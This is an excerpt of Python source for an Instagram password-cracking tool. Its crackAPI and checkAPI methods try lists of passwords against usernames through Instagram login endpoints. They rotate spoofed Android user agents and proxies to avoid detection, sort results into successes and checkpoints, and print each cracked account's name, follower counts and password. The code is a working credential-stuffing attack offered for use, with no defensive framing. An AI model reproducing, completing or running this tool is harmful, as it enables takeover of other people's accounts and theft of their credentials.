...
- Soraa🔥🔥 '''
    ...
    def crackAPI(self,user,pas):
        ...
        try:
            for pw in pas:
                ...
                g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36'
                ...
                f"Instagram {str(rr(1,9))}.0.0.{str(rr(99,999))}0.{str(rr(1,9))}.0 Android {str(rr(4,12))}; RMX{str(rr(1111,9999))} (25/7.1.1; 160dpi; 540x{((999))}; Realme; e- qcom; id_ID; 430370703)",
                f"Instagram {str(rr(1,9))}.0.0.{str(rr(99,999))}0.{str(rr(1,9))}.0 Android {str(rr(4,12))}; RMX{str(rr(1111,9999))} (25/7.1.1; 160dpi; 540x{((999))}; Realme; e- qcom; id_ID; 430370703"])
                token=s.get('https://z-p42.www.instagram.com/api/v1/web/accounts/one_tap_web_login/')
                headers = {
                    ...
                    'referer':'www.instagram.com/accounts/logout/ajax/',
                ...
                x=s.post("www.instagram.com/accounts/logout/ajax",headers=headers,data=param,proxies=proxs)
                x_jason=json.loads(x.text)
    ...
    def checkAPI(self,user,pw):
        ...
        sys.stdout.write(f"\r{CY}[•] [{K}{loop}/{len(internal)}{C}] {H}[ OK : {len(success)}]{C}  {K}[ CP : {len(checkpoint)}]{C} "),sys.stdout.flush()
        try:
            token=s.get("https://z-p42.www.instagram.com/api/v1/web/accounts/one_tap_web_login/",headers={"user-agent":User_Agent()}).content
            ...
            s.headers.update({
                ...
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://www.instagram.com/accounts/logout/ajax/',
            ...
            x=s.post("https://www.instagram.com/accounts/logout/ajax/",data=param);sleep(1)
            x_jason=json.loads(x.text)
            if "userId" in x.text:
                nama,pengikut,mengikut,postingan=self.APIinfo(user)
                io=f'Nama     : {nama}\nUsername : {user}\nPassword : {pw}\nPengikut : {pengikut}\nMengikuti: {mengikut}\nPostingan: {postingan}'
